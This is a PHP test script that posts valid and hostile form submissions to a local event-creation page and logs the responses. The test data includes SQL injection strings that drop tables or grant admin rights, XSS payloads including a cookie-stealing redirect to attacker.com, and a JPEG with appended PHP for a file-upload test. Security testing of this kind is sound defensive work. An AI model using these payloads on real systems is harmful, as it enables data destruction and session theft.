<?php

/**
 * Event Creation Test Script
 * 
 * This script tests various scenarios for event creation including:
 * - Normal successful event creation
 * - Missing required fields
 * - SQL injection attempts
 * - XSS attack attempts
 * - Image upload security
 * - Form field limits
 */

// Set timeout to allow for longer test execution
set_time_limit(120);

// Test configuration - change as needed
$base_url = "http://localhost/lama/view/pages/dashboard/create-event.php";
$image_path = __DIR__ . "/test-assets/test-image.jpg"; // Path to a test image
$malicious_image_path = __DIR__ . "/test-assets/malicious.php.jpg"; // Path to a "malicious" file for testing
$output_log = __DIR__ . "/test-results.log";

// Create output file if it doesn't exist
$log_file = fopen($output_log, "w") or die("Unable to open log file!");

// Helper function to log test results
function log_test($test_name, $status, $message = "", $response = "")
{
    global $log_file;
    $timestamp = date("Y-m-d H:i:s");
    $log_entry = "[{$timestamp}] TEST: {$test_name} | STATUS: {$status}" .
        ($message ? " | MESSAGE: {$message}" : "") . "\n";

    if ($response) {
        $log_entry .= "RESPONSE: " . substr($response, 0, 500) .
            (strlen($response) > 500 ? "...[truncated]" : "") . "\n";
    }

    $log_entry .= "-------------------------------------------------------------\n";


    fwrite($log_file, $log_entry);
    echo $log_entry . "<br>";
}

// Helper function to create a test image without requiring GD library
function create_test_image($path, $is_malicious = false)
{
    // Instead of creating an image from scratch, we'll use a pre-defined image byte content
    // This is a minimal valid JPEG file (1x1 pixel)
    $jpeg_content = base64_decode('/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD3+iiigD//2Q==');

    // Write the JPEG data to the file
    file_put_contents($path, $jpeg_content);

    // If this is supposed to be a "malicious" image, append PHP code to it
    if ($is_malicious) {
        file_put_contents($path, file_get_contents($path) . '<?php echo "Malicious code execution!"; ?>');
    }

    return $path;
}

// Create test directory and images if they don't exist
if (!file_exists(dirname($image_path))) {
    mkdir(dirname($image_path), 0755, true);
}
create_test_image($image_path);
create_test_image($malicious_image_path, true);

// Include session data for authenticated tests
session_start();
// Simulate a logged-in user if needed
if (!isset($_SESSION['user_id'])) {
    $_SESSION['user_id'] = 1; // Sample user ID for testing
}

// Test cases to run
$tests = [
    'valid_event' => [
        'name' => 'Valid Event Creation',
        'data' => [
            'organizer_id' => $_SESSION['user_id'] ?? 1,
            'title' => 'Test Event',
            'description' => 'This is a test event created through automated testing.',
            'start_date' => date('Y-m-d H:i:s', strtotime('+1 week')), // Combined date and time
            'end_date' => date('Y-m-d', strtotime('+1 week +2 hours')),
            'door_time' => '13:30',
            'event_time' => '14:00',
            'location' => 'Test Venue, 123 Test Street',
            'event_type' => 'in-person',
            'category_id' => 1,
            'capacity' => 100,
            'age_restriction' => 'All Ages',
            'status' => 'draft'
        ],
        'files' => [
            'eventImage' => [
                'name' => 'test-image.jpg',
                'type' => 'image/jpeg',
                'tmp_name' => $image_path,
                'error' => 0,
                'size' => filesize($image_path)
            ]
        ]
    ],
    'valid_event_published' => [
        'name' => 'Valid Published Event Creation',
        'data' => [
            'organizer_id' => $_SESSION['user_id'] ?? 1,
            'title' => 'Published Test Event',
            'description' => 'This is a published test event created through automated testing.',
            'start_date' => date('Y-m-d H:i:s', strtotime('+2 weeks')),
            'end_date' => date('Y-m-d', strtotime('+2 weeks +4 hours')),
            'door_time' => '18:30',
            'event_time' => '19:00',
            'location' => 'Published Venue, 456 Test Avenue',
            'event_type' => 'in-person',
            'category_id' => 3,
            'capacity' => 200,
            'age_restriction' => '18+',
            'status' => 'published'
        ],
        'files' => [
            'eventImage' => [
                'name' => 'test-image.jpg',
                'type' => 'image/jpeg',
                'tmp_name' => $image_path,
                'error' => 0,
                'size' => filesize($image_path)
            ]
        ]
    ],
    'valid_event_online' => [
        'name' => 'Valid Online Event Creation',
        'data' => [
            'organizer_id' => $_SESSION['user_id'] ?? 1,
            'title' => 'Online Test Event',
            'description' => 'This is an online test event created through automated testing.',
            'start_date' => date('Y-m-d H:i:s', strtotime('+3 weeks')),
            'end_date' => date('Y-m-d', strtotime('+3 weeks +2 hours')),
            'door_time' => '09:30',
            'event_time' => '10:00',
            'location' => '',
            'online_link' => 'https://zoom.us/j/123456789',
            'event_type' => 'online',
            'category_id' => 8,
            'capacity' => 500,
            'age_restriction' => 'All Ages',
            'status' => 'draft'
        ],
        'files' => [
            'eventImage' => [
                'name' => 'test-image.jpg',
                'type' => 'image/jpeg',
                'tmp_name' => $image_path,
                'error' => 0,
                'size' => filesize($image_path)
            ]
        ]
    ],
    'missing_required_fields' => [
        'name' => 'Missing Required Fields',
        'data' => [
            'organizer_id' => 1,
            'title' => '', // Missing title
            'description' => '', // Missing description
            'start_date' => '', // Missing date
            'location' => 'Test Venue',
            'event_type' => 'in-person',
            'status' => 'draft'
        ],
        'files' => []
    ],
    'sql_injection_attempt' => [
        'name' => 'SQL Injection Attempt',
        'data' => [
            'organizer_id' => "1; DROP TABLE events; --",
            'title' => "Test Event'; DROP TABLE users; --",
            'description' => "This is a test with SQL injection: ' OR 1=1 --",
            'start_date' => date('Y-m-d', strtotime('+1 week')),
            'event_time' => '14:00',
            'location' => "Test Venue'; DELETE FROM events WHERE 1=1; --",
            'event_type' => 'in-person',
            'category_id' => "1 OR 1=1",
            'capacity' => "100; UPDATE users SET is_admin=1 WHERE username='hacker'",
            'age_restriction' => 'All Ages',
            'status' => 'draft'
        ],
        'files' => []
    ],
    'xss_attempt' => [
        'name' => 'XSS Attack Attempt',
        'data' => [
            'organizer_id' => 1,
            'title' => '<script>alert("XSS");</script>',
            'description' => '<img src="x" onerror="alert(\'XSS\')">',
            'start_date' => date('Y-m-d', strtotime('+1 week')),
            'event_time' => '14:00',
            'location' => '<script>document.location="http://attacker.com/steal.php?cookie="+document.cookie</script>',
            'event_type' => 'in-person',
            'category_id' => 1,
            'capacity' => 100,
            'age_restriction' => 'All Ages',
            'status' => 'draft'
        ],
        'files' => []
    ],
    'malicious_file_upload' => [
        'name' => 'Malicious File Upload',
        'data' => [
            'organizer_id' => 1,
            'title' => 'Test Event with Malicious File',
            'description' => 'This is a test event with a malicious file upload.',
            'start_date' => date('Y-m-d', strtotime('+1 week')),
            'event_time' => '14:00',
            'location' => 'Test Venue',
            'event_type' => 'in-person',
            'category_id' => 1,
            'capacity' => 100,
            'age_restriction' => 'All Ages',
            'status' => 'draft'
        ],
        'files' => [
            'eventImage' => [
                'name' => 'malicious.php.jpg', // Malicious filename
                'type' => 'image/jpeg',
                'tmp_name' => $malicious_image_path,
                'error' => 0,
                'size' => filesize($malicious_image_path)
            ]
        ]
    ],
    'very_large_data' => [
        'name' => 'Very Large Data Fields',
        'data' => [
            'organizer_id' => 1,
            'title' => str_repeat('Very Long Title ', 500), // ~7500 chars
            'description' => str_repeat('This is a very long description that exceeds normal limits. ', 1000), // ~50000 chars
            'start_date' => date('Y-m-d', strtotime('+1 week')),
            'event_time' => '14:00',
            'location' => str_repeat('Very Long Location Address ', 100), // ~2500 chars
            'event_type' => 'in-person',
            'category_id' => 1,
            'capacity' => 999999999999, // Very large number
            'age_restriction' => 'All Ages',
            'status' => 'draft'
        ],
        'files' => []
    ],
    'complex_tickets_and_faqs' => [
        'name' => 'Complex Tickets and FAQs',
        'data' => [
            'organizer_id' => $_SESSION['user_id'] ?? 1,
            'title' => 'Test Event with Complex Data',
            'description' => 'This is a test event with complex tickets and FAQs.',
            'start_date' => date('Y-m-d H:i:s', strtotime('+1 week')),
            'event_time' => '14:00',
            'location' => 'Test Venue',
            'event_type' => 'in-person',
            'category_id' => 1,
            'capacity' => 100,
            'age_restriction' => 'All Ages',
            'status' => 'draft',
            'tickets' => json_encode([
                [
                    'name' => 'General Admission',
                    'price' => '25.99',
                    'quantity' => '200',
                    'sale_start' => date('Y-m-d', strtotime('-1 day')),
                    'sale_end' => date('Y-m-d', strtotime('+6 days'))
                ],
                [
                    'name' => 'VIP Ticket<script>alert("XSS");</script>', // XSS attempt
                    'price' => '99.99',
                    'quantity' => '50',
                    'sale_start' => date('Y-m-d', strtotime('-1 day')),
                    'sale_end' => date('Y-m-d', strtotime('+6 days'))
                ]
            ]),
            'faqs' => json_encode([
                [
                    'question' => 'Is parking available?',
                    'answer' => 'Yes, free parking is available.'
                ],
                [
                    'question' => '<script>document.location="http://attacker.com"</script>', // XSS attempt
                    'answer' => 'This is a malicious FAQ answer with <img src=x onerror="alert(1)">' // XSS attempt
                ]
            ]),
            'promos' => json_encode([
                [
                    'code' => 'TESTCODE',
                    'type' => 'percentage',
                    'value' => '10',
                    'valid_from' => date('Y-m-d', strtotime('-1 day')),
                    'valid_until' => date('Y-m-d', strtotime('+6 days'))
                ],
                [
                    'code' => '"; DROP TABLE promos; --', // SQL injection attempt
                    'type' => 'fixed',
                    'value' => '5',
                    'valid_from' => date('Y-m-d', strtotime('-1 day')),
                    'valid_until' => date('Y-m-d', strtotime('+6 days'))
                ]
            ])
        ],
        'files' => []
    ],
    'past_date_event' => [
        'name' => 'Event With Past Date',
        'data' => [
            'organizer_id' => $_SESSION['user_id'] ?? 1,
            'title' => 'Event With Past Date',
            'description' => 'This event has a date in the past to test date validation.',
            'start_date' => date('Y-m-d H:i:s', strtotime('-1 week')), // Past date
            'end_date' => date('Y-m-d', strtotime('-1 week +3 hours')),
            'location' => 'Past Venue',
            'event_type' => 'in-person',
            'category_id' => 5,
            'status' => 'draft'
        ],
        'files' => []
    ],
    'special_chars' => [
        'name' => 'Event With Special Characters',
        'data' => [
            'organizer_id' => $_SESSION['user_id'] ?? 1,
            'title' => 'Spécial Évènement! 特殊活動 #123',  // Unicode and special characters
            'description' => 'Description with special chars: é è ç à ù % $ # @ & * ( ) [ ] { } " \' / \\ ~ ` ± § 漢字 ひらがな',
            'start_date' => date('Y-m-d H:i:s', strtotime('+2 weeks')),
            'location' => 'Café & Restaurant "L\'Étoile" 東京都',
            'event_type' => 'in-person',
            'category_id' => 9,
            'status' => 'draft'
        ],
        'files' => []
    ],
    'zero_capacity_event' => [
        'name' => 'Event With Zero Capacity',
        'data' => [
            'organizer_id' => $_SESSION['user_id'] ?? 1,
            'title' => 'Zero Capacity Event',
            'description' => 'This event has zero capacity to test capacity validation.',
            'start_date' => date('Y-m-d H:i:s', strtotime('+3 weeks')),
            'capacity' => 0, // Zero capacity
            'location' => 'Limited Venue',
            'event_type' => 'in-person',
            'category_id' => 12,
            'status' => 'draft'
        ],
        'files' => []
    ],
    'invalid_image_format' => [
        'name' => 'Invalid Image Format Test',
        'data' => [
            'organizer_id' => $_SESSION['user_id'] ?? 1,
            'title' => 'Event With Invalid Image Format',
            'description' => 'This event tests uploading an image with invalid format.',
            'start_date' => date('Y-m-d H:i:s', strtotime('+1 month')),
            'location' => 'Image Test Venue',
            'event_type' => 'in-person',
            'category_id' => 4,
            'status' => 'draft'
        ],
        'files' => [
            'eventImage' => [
                'name' => 'test.txt', // Not an image file
                'type' => 'text/plain',
                'tmp_name' => $image_path, // We're using the image path but claiming it's text
                'error' => 0,
                'size' => filesize($image_path)
            ]
        ]
    ]
];

// Run the tests
log_test("TEST SUITE", "STARTED", "Beginning event creation tests");

foreach ($tests as $test_key => $test) {
    // Prepare the request
    $ch = curl_init($base_url);

    // Set up multipart form data
    $post_data = $test['data'];
    $post_files = [];

    // Handle files if present
    if (!empty($test['files'])) {
        foreach ($test['files'] as $field_name => $file_info) {
            $file_path = $file_info['tmp_name'];
            if (file_exists($file_path)) {
                $post_files[$field_name] = new CURLFile(
                    $file_path,
                    $file_info['type'],
                    $file_info['name']
                );
            }
        }
    }

    // Combine data and files
    $post_fields = array_merge($post_data, $post_files);

    // Set cURL options
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);

    // Execute the request
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);

    curl_close($ch);

    // Process the result
    if ($curl_error) {
        log_test($test['name'], "ERROR", "cURL Error: " . $curl_error);
    } else {
        $result = "Response received with HTTP code: {$http_code}";

        // Try to parse JSON response
        $json_response = json_decode($response, true);
        if (json_last_error() === JSON_ERROR_NONE) {
            $status = $json_response['success'] ? "SUCCESS" : "FAILURE";
            $message = $json_response['message'] ?? "No message provided";
            $result .= " | API Status: {$status} | Message: {$message}";

            if ($json_response['success'] && isset($json_response['event_id'])) {
                $result .= " | Created Event ID: {$json_response['event_id']}";
            }
        } else {
            $status = "ERROR";
            $message = "Failed to parse JSON response";
            $result .= " | Status: {$status} | Message: {$message}";
        }

        log_test($test['name'], $status, $result, $response);
    }

    // Short delay between tests
    sleep(1);
}

log_test("TEST SUITE", "COMPLETED", "All tests executed. See results above.");
fclose($log_file);

echo "<p>Testing completed! Check the log file at: <strong>{$output_log}</strong></p>";

/**
 * Manual test instructions:
 *
 * 1. Run this script in a browser or from the command line:
 *    - Browser: http://localhost/lama/test-create-event.php
 *    - CLI: php test-create-event.php
 *
 * 2. Check the test results in the generated log file.
 *
 * 3. Analyze how your application handled each scenario:
 *    - Did it properly validate required fields?
 *    - Did it sanitize SQL injection attempts?
 *    - Did it prevent XSS attacks?
 *    - Did it securely handle file uploads?
 *    - Did it handle large data appropriately?
 *
 * 4. Review the database to see what data was actually stored.
 */
?>

<h1>Event Creation Test Results</h1>

<p>Check the log file for detailed results: <?php echo htmlspecialchars($output_log); ?></p>

<h2>Test Scenarios Run:</h2>
<ul>
    <?php foreach ($tests as $test): ?>
        <li><?php echo htmlspecialchars($test['name']); ?></li>
    <?php endforeach; ?>
</ul>

<h2>Next Steps:</h2>
<ol>
    <li>Review the test log for detailed results</li>
    <li>Check your database to see what was actually stored</li>
    <li>Verify image uploads in your uploads directory</li>
    <li>Fix any identified security or validation issues</li>
</ol>

<p><a href="<?php echo $base_url; ?>">Go to Create Event page</a></p>